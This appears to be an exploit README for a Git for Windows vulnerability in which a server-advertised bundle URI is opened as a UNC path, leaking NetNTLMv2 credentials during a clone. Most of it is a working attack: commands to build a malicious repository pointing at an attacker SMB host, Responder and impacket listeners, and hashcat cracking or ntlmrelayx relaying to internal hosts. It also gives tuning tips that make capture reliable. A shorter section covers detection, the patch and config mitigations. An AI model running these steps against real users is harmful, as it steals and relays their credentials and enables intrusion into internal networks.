# Clone2Creds / CVE-2026-62960

Git for Windows: server-advertised bundle-uri is opened as a UNC path,
disclosing the victim's NetNTLMv2 credential material during `git clone`.

GHSA-xrpg-8j9v-v282 | CVSS 7.4 High | CWE-200, CWE-610

Authored by Mohamed Abdelaal (0xmrma)

## WHAT IT IS

copy_uri_to_file() in bundle-uri.c:387 positive-matches `http:` / `https:`
and lets everything else fall through to copy_file(). On Windows a value
beginning `//` or `\` is a UNC path, so opening it makes the SMB client
connect to that host and authenticate as the logged-in user.

The bundle never has to exist. The connection attempt is the payload.

## PRECONDITIONS

- victim    Windows, vulnerable Git for Windows (see AFFECTED)
- victim    transfer.bundleuri=true  -- NOT the default, must be set
- victim    account holding a real NT secret (see GOTCHAS)
- attacker  any git transport the victim will clone from
- attacker  TCP/445 reachable from the victim, inbound

## AFFECTED (Git for Windows)

```text
>= 2.40.0.windows.1, < 2.53.0.windows.4     -> MinGit 2.53.0.windows.4
>= 2.54.0.windows.1, < 2.54.0.windows.3     -> MinGit 2.54.0.windows.3
>= 2.55.0.windows.1, < 2.55.0.windows.4     -> GfW   2.55.0.windows.4
=  2.55.0-rc2.windows.1
```

Non-Windows: the same code yields a failed local open, no callback.

## EXPLOIT

### [1] attacker -- malicious repo advertising a UNC bundle URI

```sh
ATTACKER=198.51.100.5

git init --bare /srv/evil.git
git --git-dir=/srv/evil.git config uploadpack.advertiseBundleURIs true
git --git-dir=/srv/evil.git config bundle.version 1
git --git-dir=/srv/evil.git config bundle.mode    all
git --git-dir=/srv/evil.git config bundle.one.uri "//$ATTACKER/x/u.bundle"

git daemon --export-all --reuseaddr --base-path=/srv --listen=0.0.0.0
```

### [2] attacker -- listen on 445

```sh
sudo responder -I eth0
# or
sudo impacket-smbserver share /tmp -smb2support
```

### [3] victim -- one clone. the only user action required.

```powershell
git clone git://198.51.100.5:9418/evil.git C:\tmp\v
```

The clone SUCCEEDS. Only artifact visible to the victim:

```text
warning: failed to download bundle from URI '//198.51.100.5/x/u.bundle'
```

Lab shortcut: add `-c transfer.bundleuri=true` to force the precondition.
Note that doing so proves the sink, not that the target was configured
for it. Against a real target the flag must already be in their config.

### [4] attacker -- use the material

```sh
hashcat -m 5600 hash.txt rockyou.txt
# or relay it instead of cracking:
impacket-ntlmrelayx -t smb://<internal-host> -smb2support
```

## VARIANTS -- both reach the same sink

```text
bare UNC    //host/share/x.bundle
file://     file:////host/share/x.bundle
```

four slashes: `file://` is stripped, `//host/...` must survive

## VERIFY THE CAPTURE  (do not ship a pcap as proof)

A port-445 connection proves a connection, not a disclosure. Recompute:

```text
NT         = MD4(UTF16LE(password))
NTOWFv2    = HMAC_MD5(NT, UTF16LE(UPPER(user) + domain))
NTProofStr = HMAC_MD5(NTOWFv2, server_challenge || blob)

proof = response[:16]   blob = response[16:]
```

Match against the captured NTProofStr. Match => genuine NetNTLMv2.

## GOTCHAS -- each of these makes a working exploit look dead

* Passwordless victim account (Windows Hello / PIN only): the client
  connects and sends NTLMSSP_NEGOTIATE, then stops. No NT secret, so no
  AUTHENTICATE and no hash. Use a password-backed or domain-joined account.
* SMB negative cache, ~60-75s, keyed on SERVER not share. A second run at
  the same host is answered locally and never hits the wire. Wait it out or
  rotate the host/IP. Changing the share name does nothing.
* If your responder returns STATUS_LOGON_FAILURE after capturing, Windows
  marks the stored credential bad and stops reoffering it, so run two
  captures nothing. Return STATUS_SUCCESS, then fail TREE_CONNECT with
  STATUS_BAD_NETWORK_NAME.
* No share needs to exist. NTLM completes inside SESSION_SETUP, before
  TREE_CONNECT is ever sent.
* The UNC host is free text and independent of the git host. Point it at
  anything the victim can reach, including internal hosts.

## CHAIN NOTES

* Clone time only. A later `git fetch` does not re-request the bundle list.
* Transport is irrelevant: git://, http://, https://, ssh:// all work.
* No prompt, no dialog, no failed command. The clone completes normally.
* Output is credential material, not a session: crack it, or relay it to
  any service in the environment still accepting NTLM.

## DETECT / FIX

```sh
git config --show-origin --get-all transfer.bundleURI
  # any output is a finding, and names the file it came from
git --version
  # compare against AFFECTED
```

A patched client refuses it outright, with no connection:

```text
warning: skipping bundle URI '//host/x/u.bundle': protocol 'file' is not allowed
```

Mitigation on unpatched clients:

```sh
git config --global transfer.bundleuri false
```

Blocking egress TCP/445 removes the disclosure but not the coerced
connection, and does nothing about an internal target.

Config also hides from a filesystem audit in two places: `-c
transfer.bundleuri=true` on a command line, and GIT_CONFIG_COUNT with
GIT_CONFIG_KEY_0 / GIT_CONFIG_VALUE_0 in the environment. Grep pipeline
definitions too. Git config variable names are case-insensitive.

## REFERENCES

- <https://github.com/git-for-windows/git/security/advisories/GHSA-xrpg-8j9v-v282>
- <https://www.cve.org/CVERecord?id=CVE-2026-62960>
- <https://github.com/git-for-windows/git/commit/40b7c8acfe635e29dc15a01c0c0d15cc6beacd56>

An SMB responder collects credentials from every
host that reaches it, not just your target. Keep it on a network you own.

0xmrma sends his regards!
